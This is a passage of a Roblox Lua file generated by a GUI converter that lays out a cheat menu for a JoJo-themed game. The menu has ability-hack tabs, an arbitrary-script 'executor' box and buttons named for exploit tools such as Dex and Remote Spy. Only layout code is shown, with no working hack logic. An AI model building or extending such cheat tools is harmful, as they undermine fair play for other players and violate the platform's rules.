-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local MainTabs = Instance.new("Frame")
local Tab1 = Instance.new("TextButton")
local Tab2 = Instance.new("TextButton")
local Tab4 = Instance.new("TextButton")
local Tab3 = Instance.new("TextButton")
local Tab6 = Instance.new("TextButton")
local Tab5 = Instance.new("TextButton")
local Executor = Instance.new("TextButton")
local Tab7 = Instance.new("TextButton")
local Tabs = Instance.new("Folder")
local Tab1_2 = Instance.new("Frame")
local _15SecondTS = Instance.new("TextLabel")
local _15SecondTSButton = Instance.new("ImageButton")
local TextLabel = Instance.new("TextLabel")
local AntiTS = Instance.new("TextLabel")
local AntiTSButton = Instance.new("ImageButton")
local BlockGlitch = Instance.new("TextLabel")
local BlockGlitch_2 = Instance.new("ImageButton")
local Executor_2 = Instance.new("Frame")
local TextLabel_2 = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local Execute = Instance.new("TextButton")
local Clear = Instance.new("TextButton")
local Home = Instance.new("Frame")
local Welcome = Instance.new("TextLabel")
local Quote = Instance.new("TextLabel")
local Tab2_2 = Instance.new("Frame")
local STWRTZ = Instance.new("TextLabel")
local STWRTZButton = Instance.new("ImageButton")
local TextLabel_3 = Instance.new("TextLabel")
local GERRTZ = Instance.new("TextLabel")
local STWRTZButton_2 = Instance.new("ImageButton")
local D4CClones = Instance.new("TextLabel")
local D4CClonesButton = Instance.new("ImageButton")
local Tab6_2 = Instance.new("Frame")
local ESplash = Instance.new("TextLabel")
local ESplashButton = Instance.new("ImageButton")
local TextLabel_4 = Instance.new("TextLabel")
local Tab7_2 = Instance.new("Frame")
local ESplash_2 = Instance.new("TextLabel")
local ESplashButton_2 = Instance.new("ImageButton")
local TextLabel_5 = Instance.new("TextLabel")
local Tab4_2 = Instance.new("Frame")
local ESplash_3 = Instance.new("TextLabel")
local ESplashButton_3 = Instance.new("ImageButton")
local TextLabel_6 = Instance.new("TextLabel")
local Tab3_2 = Instance.new("Frame")
local ESplash_4 = Instance.new("TextLabel")
local ESplashButton_4 = Instance.new("ImageButton")
local TextLabel_7 = Instance.new("TextLabel")
local Tab5_2 = Instance.new("Frame")
local ESplash_5 = Instance.new("TextLabel")
local ESplashButton_5 = Instance.new("ImageButton")
local TextLabel_8 = Instance.new("TextLabel")
local Settings = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local ReduceLag = Instance.new("TextButton")
local DeleteFire = Instance.new("TextButton")
local AttemptServerside = Instance.new("TextButton")
local RespawnSameSpot = Instance.new("TextButton")
local Settings_2 = Instance.new("ImageButton")
local Close = Instance.new("TextButton")
local Minimize = Instance.new("TextButton")
local SHub = Instance.new("TextButton")
local Sidebar = Instance.new("Frame")
local ScrollingFrame_2 = Instance.new("ScrollingFrame")
local IY = Instance.new("TextButton")
local Dex = Instance.new("TextButton")
local Rspy = Instance.new("TextButton")
local SAF = Instance.new("TextButton")
local HBEGUI = Instance.new("TextButton")
local NA = Instance.new("TextButton")
local Title = Instance.new("TextLabel")
local Home_2 = Instance.new("ImageButton")
local Clock = Instance.new("TextLabel")
local ProfilePicture = Instance.new("ImageLabel")
local FullView = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game:WaitForChild("CoreGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(61, 61, 61)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 5
Frame.Position = UDim2.new(0.168380469, 0, 0.206766918, 0)
Frame.Size = UDim2.new(0, 516, 0, 29)

MainTabs.Name = "MainTabs"
MainTabs.Parent = Frame
MainTabs.BackgroundColor3 = Color3.fromRGB(167, 167, 167)
MainTabs.BackgroundTransparency = 0.300
MainTabs.BorderColor3 = Color3.fromRGB(0, 0, 0)
MainTabs.BorderSizePixel = 5
MainTabs.Position = UDim2.new(0, 0, 1, 0)
MainTabs.Size = UDim2.new(0, 516, 0, 223)

Tab1.Name = "Tab 1"
Tab1.Parent = MainTabs
Tab1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab1.BackgroundTransparency = 1.000
Tab1.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab1.BorderSizePixel = 0
Tab1.Size = UDim2.new(0, 104, 0, 28)
Tab1.Font = Enum.Font.Unknown
Tab1.Text = "Tab 1"
Tab1.TextColor3 = Color3.fromRGB(0, 0, 0)
Tab1.TextSize = 14.000

Tab2.Name = "Tab 2"
Tab2.Parent = MainTabs
Tab2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab2.BackgroundTransparency = 1.000
Tab2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab2.BorderSizePixel = 0
Tab2.Position = UDim2.new(0, 0, 0.125560537, 0)
Tab2.Size = UDim2.new(0, 104, 0, 28)
Tab2.Font = Enum.Font.Unknown
Tab2.Text = "Tab 2"
Tab2.TextColor3 = Color3.fromRGB(0, 0, 0)
Tab2.TextSize = 14.000

Tab4.Name = "Tab 4"
Tab4.Parent = MainTabs
Tab4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab4.BackgroundTransparency = 1.000
Tab4.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab4.BorderSizePixel = 0
Tab4.Position = UDim2.new(0, 0, 0.376681626, 0)
Tab4.Size = UDim2.new(0, 104, 0, 28)
Tab4.Font = Enum.Font.Unknown
Tab4.Text = "Tab 4"
Tab4.TextColor3 = Color3.fromRGB(0, 0, 0)
Tab4.TextSize = 14.000

Tab3.Name = "Tab 3"
Tab3.Parent = MainTabs
Tab3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab3.BackgroundTransparency = 1.000
Tab3.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab3.BorderSizePixel = 0
Tab3.Position = UDim2.new(0, 0, 0.251121074, 0)
Tab3.Size = UDim2.new(0, 104, 0, 28)
Tab3.Font = Enum.Font.Unknown
Tab3.Text = "Tab 3"
Tab3.TextColor3 = Color3.fromRGB(0, 0, 0)
Tab3.TextSize = 14.000

Tab6.Name = "Tab 6"
Tab6.Parent = MainTabs
Tab6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab6.BackgroundTransparency = 1.000
Tab6.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab6.BorderSizePixel = 0
Tab6.Position = UDim2.new(0, 0, 0.62780267, 0)
Tab6.Size = UDim2.new(0, 104, 0, 28)
Tab6.Font = Enum.Font.Unknown
Tab6.Text = "Tab 6"
Tab6.TextColor3 = Color3.fromRGB(0, 0, 0)
Tab6.TextSize = 14.000

Tab5.Name = "Tab 5"
Tab5.Parent = MainTabs
Tab5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab5.BackgroundTransparency = 1.000
Tab5.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab5.BorderSizePixel = 0
Tab5.Position = UDim2.new(0, 0, 0.502242148, 0)
Tab5.Size = UDim2.new(0, 104, 0, 28)
Tab5.Font = Enum.Font.Unknown
Tab5.Text = "Tab 5"
Tab5.TextColor3 = Color3.fromRGB(0, 0, 0)
Tab5.TextSize = 14.000

Executor.Name = "Executor"
Executor.Parent = MainTabs
Executor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Executor.BackgroundTransparency = 1.000
Executor.BorderColor3 = Color3.fromRGB(0, 0, 0)
Executor.BorderSizePixel = 0
Executor.Position = UDim2.new(0, 0, 0.878923774, 0)
Executor.Size = UDim2.new(0, 104, 0, 28)
Executor.Font = Enum.Font.Unknown
Executor.Text = "Executor"
Executor.TextColor3 = Color3.fromRGB(0, 0, 0)
Executor.TextSize = 14.000

Tab7.Name = "Tab 7"
Tab7.Parent = MainTabs
Tab7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab7.BackgroundTransparency = 1.000
Tab7.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab7.BorderSizePixel = 0
Tab7.Position = UDim2.new(0, 0, 0.753363252, 0)
Tab7.Size = UDim2.new(0, 104, 0, 28)
Tab7.Font = Enum.Font.Unknown
Tab7.Text = "Tab 7"
Tab7.TextColor3 = Color3.fromRGB(0, 0, 0)
Tab7.TextSize = 14.000

Tabs.Name = "Tabs"
Tabs.Parent = MainTabs

Tab1_2.Name = "Tab1"
Tab1_2.Parent = Tabs
Tab1_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab1_2.BackgroundTransparency = 0.500
Tab1_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab1_2.BorderSizePixel = 5
Tab1_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Tab1_2.Size = UDim2.new(0, 412, 0, 224)
Tab1_2.Visible = false

_15SecondTS.Name = "15SecondTS"
_15SecondTS.Parent = Tab1_2
_15SecondTS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
_15SecondTS.BackgroundTransparency = 1.000
_15SecondTS.BorderColor3 = Color3.fromRGB(0, 0, 0)
_15SecondTS.BorderSizePixel = 0
_15SecondTS.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
_15SecondTS.Size = UDim2.new(0, 200, 0, 50)
_15SecondTS.Font = Enum.Font.ArialBold
_15SecondTS.Text = "15 Second TS"
_15SecondTS.TextColor3 = Color3.fromRGB(0, 0, 0)
_15SecondTS.TextScaled = true
_15SecondTS.TextSize = 14.000
_15SecondTS.TextWrapped = true

_15SecondTSButton.Name = "15SecondTSButton"
_15SecondTSButton.Parent = _15SecondTS
_15SecondTSButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
_15SecondTSButton.BackgroundTransparency = 1.000
_15SecondTSButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
_15SecondTSButton.BorderSizePixel = 0
_15SecondTSButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
_15SecondTSButton.Size = UDim2.new(0, 20, 0, 32)
_15SecondTSButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

TextLabel.Parent = Tab1_2
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 5
TextLabel.Size = UDim2.new(0, 412, 0, 22)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = "TAB 1"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

AntiTS.Name = "AntiTS"
AntiTS.Parent = Tab1_2
AntiTS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AntiTS.BackgroundTransparency = 1.000
AntiTS.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiTS.BorderSizePixel = 0
AntiTS.Position = UDim2.new(0.0825242698, 0, 0.40625, 0)
AntiTS.Size = UDim2.new(0, 200, 0, 50)
AntiTS.Font = Enum.Font.ArialBold
AntiTS.Text = "Anti Timestop"
AntiTS.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiTS.TextScaled = true
AntiTS.TextSize = 14.000
AntiTS.TextWrapped = true

AntiTSButton.Name = "AntiTSButton"
AntiTSButton.Parent = AntiTS
AntiTSButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AntiTSButton.BackgroundTransparency = 1.000
AntiTSButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiTSButton.BorderSizePixel = 0
AntiTSButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
AntiTSButton.Size = UDim2.new(0, 20, 0, 32)
AntiTSButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

BlockGlitch.Name = "BlockGlitch"
BlockGlitch.Parent = Tab1_2
BlockGlitch.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BlockGlitch.BackgroundTransparency = 1.000
BlockGlitch.BorderColor3 = Color3.fromRGB(0, 0, 0)
BlockGlitch.BorderSizePixel = 0
BlockGlitch.Position = UDim2.new(0.0825242698, 0, 0.705357134, 0)
BlockGlitch.Size = UDim2.new(0, 200, 0, 50)
BlockGlitch.Font = Enum.Font.ArialBold
BlockGlitch.Text = "Block Glitch"
BlockGlitch.TextColor3 = Color3.fromRGB(0, 0, 0)
BlockGlitch.TextScaled = true
BlockGlitch.TextSize = 14.000
BlockGlitch.TextWrapped = true

BlockGlitch_2.Name = "BlockGlitch"
BlockGlitch_2.Parent = BlockGlitch
BlockGlitch_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BlockGlitch_2.BackgroundTransparency = 1.000
BlockGlitch_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
BlockGlitch_2.BorderSizePixel = 0
BlockGlitch_2.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
BlockGlitch_2.Size = UDim2.new(0, 20, 0, 32)
BlockGlitch_2.Image = "http://www.roblox.com/asset/?id=107075188558816"

Executor_2.Name = "Executor"
Executor_2.Parent = Tabs
Executor_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Executor_2.BackgroundTransparency = 0.500
Executor_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Executor_2.BorderSizePixel = 5
Executor_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Executor_2.Size = UDim2.new(0, 412, 0, 224)
Executor_2.Visible = false

TextLabel_2.Parent = Executor_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 5
TextLabel_2.Size = UDim2.new(0, 412, 0, 22)
TextLabel_2.Font = Enum.Font.Unknown
TextLabel_2.Text = "AWAKENED EXECUTOR"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

TextBox.Parent = Executor_2
TextBox.BackgroundColor3 = Color3.fromRGB(63, 63, 63)
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0, 0, 0.0982142836, 0)
TextBox.Size = UDim2.new(0, 412, 0, 140)
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = "--WRITE YOUR SCRIPT"
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 14.000
TextBox.TextWrapped = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top

Execute.Name = "Execute"
Execute.Parent = Executor_2
Execute.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Execute.BorderColor3 = Color3.fromRGB(0, 0, 0)
Execute.BorderSizePixel = 0
Execute.Position = UDim2.new(0, 0, 0.723214269, 0)
Execute.Size = UDim2.new(0, 202, 0, 62)
Execute.Font = Enum.Font.SourceSans
Execute.Text = "EXECUTE"
Execute.TextColor3 = Color3.fromRGB(255, 255, 255)
Execute.TextSize = 14.000

Clear.Name = "Clear"
Clear.Parent = Executor_2
Clear.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Clear.BorderColor3 = Color3.fromRGB(0, 0, 0)
Clear.BorderSizePixel = 0
Clear.Position = UDim2.new(0.509708762, 0, 0.723214269, 0)
Clear.Size = UDim2.new(0, 202, 0, 62)
Clear.Font = Enum.Font.SourceSans
Clear.Text = "CLEAR"
Clear.TextColor3 = Color3.fromRGB(255, 255, 255)
Clear.TextSize = 14.000

Home.Name = "Home"
Home.Parent = Tabs
Home.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Home.BackgroundTransparency = 1.000
Home.BorderColor3 = Color3.fromRGB(0, 0, 0)
Home.BorderSizePixel = 0
Home.Position = UDim2.new(0.187984496, 0, 0, 0)
Home.Size = UDim2.new(0, 419, 0, 224)

Welcome.Name = "Welcome"
Welcome.Parent = Home
Welcome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Welcome.BackgroundTransparency = 1.000
Welcome.BorderColor3 = Color3.fromRGB(0, 0, 0)
Welcome.BorderSizePixel = 0
Welcome.Position = UDim2.new(0.0167064443, 0, 0.0758928582, 0)
Welcome.Size = UDim2.new(0, 365, 0, 50)
Welcome.Font = Enum.Font.SourceSans
Welcome.Text = "Welcome, User!"
Welcome.TextColor3 = Color3.fromRGB(0, 0, 0)
Welcome.TextScaled = true
Welcome.TextSize = 14.000
Welcome.TextWrapped = true
Welcome.TextXAlignment = Enum.TextXAlignment.Left

Quote.Name = "Quote"
Quote.Parent = Home
Quote.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Quote.BackgroundTransparency = 1.000
Quote.BorderColor3 = Color3.fromRGB(0, 0, 0)
Quote.BorderSizePixel = 0
Quote.Position = UDim2.new(0, 0, 0.299107134, 0)
Quote.Size = UDim2.new(0, 419, 0, 139)
Quote.Font = Enum.Font.SourceSans
Quote.Text = "Quote"
Quote.TextColor3 = Color3.fromRGB(0, 0, 0)
Quote.TextScaled = true
Quote.TextSize = 14.000
Quote.TextWrapped = true

Tab2_2.Name = "Tab2"
Tab2_2.Parent = Tabs
Tab2_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab2_2.BackgroundTransparency = 0.500
Tab2_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab2_2.BorderSizePixel = 5
Tab2_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Tab2_2.Size = UDim2.new(0, 412, 0, 224)
Tab2_2.Visible = false

STWRTZ.Name = "STWRTZ"
STWRTZ.Parent = Tab2_2
STWRTZ.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
STWRTZ.BackgroundTransparency = 1.000
STWRTZ.BorderColor3 = Color3.fromRGB(0, 0, 0)
STWRTZ.BorderSizePixel = 0
STWRTZ.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
STWRTZ.Size = UDim2.new(0, 200, 0, 50)
STWRTZ.Font = Enum.Font.ArialBold
STWRTZ.Text = "Shadow The World Dodge"
STWRTZ.TextColor3 = Color3.fromRGB(0, 0, 0)
STWRTZ.TextScaled = true
STWRTZ.TextSize = 14.000
STWRTZ.TextWrapped = true

STWRTZButton.Name = "STWRTZButton"
STWRTZButton.Parent = STWRTZ
STWRTZButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
STWRTZButton.BackgroundTransparency = 1.000
STWRTZButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
STWRTZButton.BorderSizePixel = 0
STWRTZButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
STWRTZButton.Size = UDim2.new(0, 20, 0, 32)
STWRTZButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

TextLabel_3.Parent = Tab2_2
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.BorderSizePixel = 5
TextLabel_3.Size = UDim2.new(0, 412, 0, 22)
TextLabel_3.Font = Enum.Font.Unknown
TextLabel_3.Text = "TAB 2"
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true

GERRTZ.Name = "GERRTZ"
GERRTZ.Parent = Tab2_2
GERRTZ.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
GERRTZ.BackgroundTransparency = 1.000
GERRTZ.BorderColor3 = Color3.fromRGB(0, 0, 0)
GERRTZ.BorderSizePixel = 0
GERRTZ.Position = UDim2.new(0.0825242698, 0, 0.379464298, 0)
GERRTZ.Size = UDim2.new(0, 200, 0, 50)
GERRTZ.Font = Enum.Font.ArialBold
GERRTZ.Text = "GER Return To Zero"
GERRTZ.TextColor3 = Color3.fromRGB(0, 0, 0)
GERRTZ.TextScaled = true
GERRTZ.TextSize = 14.000
GERRTZ.TextWrapped = true

STWRTZButton_2.Name = "STWRTZButton"
STWRTZButton_2.Parent = GERRTZ
STWRTZButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
STWRTZButton_2.BackgroundTransparency = 1.000
STWRTZButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
STWRTZButton_2.BorderSizePixel = 0
STWRTZButton_2.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
STWRTZButton_2.Size = UDim2.new(0, 20, 0, 32)
STWRTZButton_2.Image = "http://www.roblox.com/asset/?id=107075188558816"

D4CClones.Name = "D4CClones"
D4CClones.Parent = Tab2_2
D4CClones.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
D4CClones.BackgroundTransparency = 1.000
D4CClones.BorderColor3 = Color3.fromRGB(0, 0, 0)
D4CClones.BorderSizePixel = 0
D4CClones.Position = UDim2.new(0.0825242698, 0, 0.65625, 0)
D4CClones.Size = UDim2.new(0, 200, 0, 50)
D4CClones.Font = Enum.Font.ArialBold
D4CClones.Text = "D4C Clone Spam (F2, F3, F4)"
D4CClones.TextColor3 = Color3.fromRGB(0, 0, 0)
D4CClones.TextScaled = true
D4CClones.TextSize = 14.000
D4CClones.TextWrapped = true

D4CClonesButton.Name = "D4CClonesButton"
D4CClonesButton.Parent = D4CClones
D4CClonesButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
D4CClonesButton.BackgroundTransparency = 1.000
D4CClonesButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
D4CClonesButton.BorderSizePixel = 0
D4CClonesButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
D4CClonesButton.Size = UDim2.new(0, 20, 0, 32)
D4CClonesButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

Tab6_2.Name = "Tab6"
Tab6_2.Parent = Tabs
Tab6_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab6_2.BackgroundTransparency = 0.500
Tab6_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab6_2.BorderSizePixel = 5
Tab6_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Tab6_2.Size = UDim2.new(0, 412, 0, 224)
Tab6_2.Visible = false

ESplash.Name = "ESplash"
ESplash.Parent = Tab6_2
ESplash.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ESplash.BackgroundTransparency = 1.000
ESplash.BorderColor3 = Color3.fromRGB(0, 0, 0)
ESplash.BorderSizePixel = 0
ESplash.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
ESplash.Size = UDim2.new(0, 200, 0, 50)
ESplash.Font = Enum.Font.ArialBold
ESplash.Text = "Emerald Splash"
ESplash.TextColor3 = Color3.fromRGB(0, 0, 0)
ESplash.TextScaled = true
ESplash.TextSize = 14.000
ESplash.TextWrapped = true

ESplashButton.Name = "ESplashButton"
ESplashButton.Parent = ESplash
ESplashButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ESplashButton.BackgroundTransparency = 1.000
ESplashButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
ESplashButton.BorderSizePixel = 0
ESplashButton.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
ESplashButton.Size = UDim2.new(0, 20, 0, 32)
ESplashButton.Image = "http://www.roblox.com/asset/?id=107075188558816"

TextLabel_4.Parent = Tab6_2
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.BorderSizePixel = 5
TextLabel_4.Size = UDim2.new(0, 412, 0, 22)
TextLabel_4.Font = Enum.Font.Unknown
TextLabel_4.Text = "TAB 1"
TextLabel_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14.000
TextLabel_4.TextWrapped = true

Tab7_2.Name = "Tab7"
Tab7_2.Parent = Tabs
Tab7_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab7_2.BackgroundTransparency = 0.500
Tab7_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab7_2.BorderSizePixel = 5
Tab7_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Tab7_2.Size = UDim2.new(0, 412, 0, 224)
Tab7_2.Visible = false

ESplash_2.Name = "ESplash"
ESplash_2.Parent = Tab7_2
ESplash_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ESplash_2.BackgroundTransparency = 1.000
ESplash_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ESplash_2.BorderSizePixel = 0
ESplash_2.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
ESplash_2.Size = UDim2.new(0, 200, 0, 50)
ESplash_2.Font = Enum.Font.ArialBold
ESplash_2.Text = "Emerald Splash"
ESplash_2.TextColor3 = Color3.fromRGB(0, 0, 0)
ESplash_2.TextScaled = true
ESplash_2.TextSize = 14.000
ESplash_2.TextWrapped = true

ESplashButton_2.Name = "ESplashButton"
ESplashButton_2.Parent = ESplash_2
ESplashButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ESplashButton_2.BackgroundTransparency = 1.000
ESplashButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ESplashButton_2.BorderSizePixel = 0
ESplashButton_2.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
ESplashButton_2.Size = UDim2.new(0, 20, 0, 32)
ESplashButton_2.Image = "http://www.roblox.com/asset/?id=107075188558816"

TextLabel_5.Parent = Tab7_2
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.BorderSizePixel = 5
TextLabel_5.Size = UDim2.new(0, 412, 0, 22)
TextLabel_5.Font = Enum.Font.Unknown
TextLabel_5.Text = "TAB 1"
TextLabel_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14.000
TextLabel_5.TextWrapped = true

Tab4_2.Name = "Tab4"
Tab4_2.Parent = Tabs
Tab4_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab4_2.BackgroundTransparency = 0.500
Tab4_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab4_2.BorderSizePixel = 5
Tab4_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Tab4_2.Size = UDim2.new(0, 412, 0, 224)
Tab4_2.Visible = false

ESplash_3.Name = "ESplash"
ESplash_3.Parent = Tab4_2
ESplash_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ESplash_3.BackgroundTransparency = 1.000
ESplash_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
ESplash_3.BorderSizePixel = 0
ESplash_3.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
ESplash_3.Size = UDim2.new(0, 200, 0, 50)
ESplash_3.Font = Enum.Font.ArialBold
ESplash_3.Text = "Emerald Splash"
ESplash_3.TextColor3 = Color3.fromRGB(0, 0, 0)
ESplash_3.TextScaled = true
ESplash_3.TextSize = 14.000
ESplash_3.TextWrapped = true

ESplashButton_3.Name = "ESplashButton"
ESplashButton_3.Parent = ESplash_3
ESplashButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ESplashButton_3.BackgroundTransparency = 1.000
ESplashButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
ESplashButton_3.BorderSizePixel = 0
ESplashButton_3.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
ESplashButton_3.Size = UDim2.new(0, 20, 0, 32)
ESplashButton_3.Image = "http://www.roblox.com/asset/?id=107075188558816"

TextLabel_6.Parent = Tab4_2
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.BorderSizePixel = 5
TextLabel_6.Size = UDim2.new(0, 412, 0, 22)
TextLabel_6.Font = Enum.Font.Unknown
TextLabel_6.Text = "TAB 1"
TextLabel_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 14.000
TextLabel_6.TextWrapped = true

Tab3_2.Name = "Tab3"
Tab3_2.Parent = Tabs
Tab3_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Tab3_2.BackgroundTransparency = 0.500
Tab3_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Tab3_2.BorderSizePixel = 5
Tab3_2.Position = UDim2.new(0.201550394, 0, -0.00448430516, 0)
Tab3_2.Size = UDim2.new(0, 412, 0, 224)
Tab3_2.Visible = false

ESplash_4.Name = "ESplash"
ESplash_4.Parent = Tab3_2
ESplash_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ESplash_4.BackgroundTransparency = 1.000
ESplash_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
ESplash_4.BorderSizePixel = 0
ESplash_4.Position = UDim2.new(0.0825242698, 0, 0.129464284, 0)
ESplash_4.Size = UDim2.new(0, 200, 0, 50)
ESplash_4.Font = Enum.Font.ArialBold
ESplash_4.Text = "Emerald Splash (LeftCtrl, K)"
ESplash_4.TextColor3 = Color3.fromRGB(0, 0, 0)
ESplash_4.TextScaled = true
ESplash_4.TextSize = 14.000
ESplash_4.TextWrapped = true

ESplashButton_4.Name = "ESplashButton"
ESplashButton_4.Parent = ESplash_4
ESplashButton_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ESplashButton_4.BackgroundTransparency = 1.000
ESplashButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
ESplashButton_4.BorderSizePixel = 0
ESplashButton_4.Position = UDim2.new(1.04999995, 0, 0.180000007, 0)
ESplashButton_4.Size = UDim2.new(0, 20, 0, 32)
